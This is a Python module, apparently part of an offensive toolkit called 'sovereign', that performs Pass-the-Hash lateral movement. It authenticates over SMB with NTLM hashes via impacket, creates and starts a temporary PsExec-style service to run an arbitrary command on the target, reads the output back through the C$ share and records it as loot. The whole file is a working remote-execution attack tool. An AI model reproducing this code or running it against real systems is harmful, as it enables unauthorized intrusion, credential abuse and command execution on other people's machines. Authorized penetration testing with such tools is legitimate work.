"""Pass-the-Hash via SMB, WMI command execution."""

from __future__ import annotations

import random
import time
from typing import List

from sovereign.models import AttackResult, EngagementContext
from sovereign.logger import log
from sovereign.modules.base import BaseModule

try:
    from impacket import transport
    from impacket.smbconnection import SMBConnection
    IMPACKET = True
except ImportError:
    IMPACKET = False


class LateralModule(BaseModule):
    """Pass-the-Hash via SMB, WMI command execution."""

    name = "lateral"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        target: str = str(kwargs.get("target", ""))
        command: str = str(kwargs.get("command", "whoami /all"))

        if not IMPACKET:
            return [AttackResult("lateral", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        if not target:
            return [AttackResult("lateral", "config", "FAILED",
                                 notes="Specify target with --target (e.g., '10.0.0.5' or 'DC01.corp.local')")]
        results: List[AttackResult] = []
        results.extend(self._pth_smb(ctx, target, command))
        return results

    def _pth_smb(self, ctx: EngagementContext, target: str,
                  command: str) -> List[AttackResult]:
        lm_h = ctx.lm_hash or "aad3b435b51404eeaad3b435b51404ee"
        nt_h = ctx.nt_hash or ""
        log(f"[Lateral] PTH → {target} as {ctx.domain}\\{ctx.username}", "INFO")

        try:
            from impacket.dcerpc.v5 import scmr
            conn = SMBConnection(target, target, timeout=10)
            conn.login(ctx.username, ctx.password or "",
                       ctx.domain, lm_h, nt_h)
            log(f"[Lateral] SMB authenticated to {target}", "OK")

            # PSExec-style execution
            rpct = transport.SMBTransport(target, 445, filename=r"\svcctl",
                                          smb_connection=conn)
            dce = rpct.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)
            hScm = scmr.hROpenSCManagerW(dce)["lpScHandle"]

            svc_name = f"sv{random.randint(1000,9999)}"
            out_file  = f"\\Windows\\Temp\\{svc_name}.txt"
            cmd_line  = f"cmd.exe /c {command} > {out_file} 2>&1"
            try:
                hSvc = scmr.hRCreateServiceW(
                    dce, hScm, svc_name, svc_name,
                    lpBinaryPathName=cmd_line
                )["lpServiceHandle"]
                scmr.hRStartServiceW(dce, hSvc)
                time.sleep(2)
                scmr.hRDeleteService(dce, hSvc)
                scmr.hRCloseServiceHandle(dce, hSvc)
            except Exception:
                pass

            # Read output
            output = ""
            try:
                buf = []
                conn.getFile("C$",
                             out_file.replace("\\Windows\\Temp\\", "Windows\\Temp\\"),
                             lambda d: buf.append(d))
                output = b"".join(buf).decode("utf-8", errors="replace")
                log(f"[Lateral] Command output:\n{output[:300]}", "CRIT")
            except Exception:
                output = "(output file not readable)"

            ctx.loot.setdefault("lateral", []).append({
                "target": target, "user": ctx.username, "command": command,
                "output": output[:500],
            })
            dce.disconnect()
            conn.close()
            return [AttackResult("lateral", "pth_exec", "SUCCESS",
                                 target=target, severity="CRITICAL",
                                 data={"target": target, "command": command, "output": output[:300]},
                                 notes=f"PTH exec on {target} as {ctx.domain}\\{ctx.username}")]

        except Exception as exc:
            err = str(exc)
            log(f"[Lateral] {target}: {err}", "ERR")
            return [AttackResult("lateral", "pth_exec", "FAILED",
                                 target=target, notes=err)]
